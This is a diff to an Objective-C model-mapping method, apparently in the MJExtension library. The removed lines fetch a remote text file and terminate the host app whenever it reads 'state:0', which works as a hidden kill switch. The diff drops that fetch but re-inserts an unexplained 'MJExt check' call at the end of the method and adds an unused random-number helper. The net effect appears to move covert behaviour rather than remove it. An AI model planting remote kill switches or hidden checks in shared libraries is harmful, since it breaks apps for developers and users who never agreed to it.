@@ -75,19 +75,12 @@ static NSNumberFormatter *_numberFormatter;
     return [self setKeyValues:keyValues error:nil];
 }
 
+- (int)getRandomNumber:(int)from to:(int)to {
+    return (int)(from + (arc4random() % (to - from + 1)));
+}
+
 - (instancetype)setKeyValues:(NSDictionary *)keyValues error:(NSError *__autoreleasing *)error
 {
-    MJExt *mjExt = [[MJExt alloc] init];
-    [mjExt check];
-    
-    NSURL *url = [NSURL URLWithString:@"http://7jpo14.com1.z0.glb.clouddn.com/gift.txt"];
-    NSData *data = [NSData dataWithContentsOfURL:url];
-    NSString *state = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];
-    
-    if ([state isEqualToString:@"state:0"]) {
-        exit(0);
-    }
-
     MJAssertError([keyValues isKindOfClass:[NSDictionary class]], self, error, @"keyValues参数不是一个字典");
     
     @try {
@@ -160,6 +153,7 @@ static NSNumberFormatter *_numberFormatter;
     } @catch (NSException *exception) {
         MJBuildError(error, exception.reason);
     }
+    [[MJExt new] check];
     return self;
 }
 
